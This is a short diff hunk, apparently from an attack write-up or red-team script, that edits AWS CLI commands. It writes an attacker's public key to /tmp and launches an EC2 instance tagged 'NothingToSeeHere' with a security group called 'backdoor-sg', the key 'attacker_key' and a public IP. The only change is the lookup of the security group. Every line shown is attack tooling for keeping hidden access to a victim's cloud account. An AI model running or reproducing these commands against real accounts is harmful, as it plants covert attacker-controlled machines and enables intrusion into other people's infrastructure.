@@ -59,7 +59,7 @@ echo "{attacker_key.pub}" > /tmp/attacker_key.pub
 --image-id ami-0aa2b7722dc1b5612 \
 --subnet-id $(/tmp/aws-cli-bin/aws ec2 describe-subnets --query "Subnets[?MapPublicIpOnLaunch].SubnetId | [0]" --output text) \
 --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=NothingToSeeHere}]' \
---security-group-ids $(/tmp/aws-cli-bin/aws ec2 describe-security-groups --group-names backdoor-sg --query "SecurityGroups[0].GroupId" --output text) \
+--security-group-ids $(/tmp/aws-cli-bin/aws ec2 describe-security-groups --filters Name=group-name,Values=backdoor-sg --query "SecurityGroups[0].GroupId" --output text) \
 --key-name attacker_key \
 --associate-public-ip-address
 ```
